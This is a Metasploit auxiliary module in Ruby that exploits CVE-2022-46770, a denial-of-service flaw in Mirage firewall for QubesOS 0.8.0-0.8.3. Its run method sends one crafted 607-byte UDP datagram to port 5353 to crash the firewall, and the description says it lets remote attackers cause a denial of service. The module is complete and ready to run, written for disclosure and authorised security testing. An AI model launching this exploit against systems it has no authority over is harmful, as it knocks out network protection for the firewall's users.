##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Mirage firewall for QubesOS 0.8.0-0.8.3 Denial of Service (DoS) Exploit',
      'Description'    => %q{
          This module allows remote attackers to cause a denial of service (DoS)
          in Mirage firewall for QubesOS 0.8.0-0.8.3 via a specifically crafted UDP request.
      },
      'Author'         => 'Krzysztof Burghardt <krzysztof@burghardt.pl>',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2022-46770' ],
          [ 'URL', 'https://mirage.io/blog/MSA03' ],
          [ 'URL', 'https://github.com/mirage/qubes-mirage-firewall/issues/166' ],
        ],
      'DisclosureDate' => '2022-12-04',
    ))

    register_options(
    [
      Opt::RPORT(5353),
      Opt::RHOST('239.255.255.250'),
    ])
  end

  def run
    connect_udp

	pkt = 'a'*607
	print_status("Sending datagram to #{rhost}...")
	udp_sock.put(pkt)

    disconnect_udp
  end
end
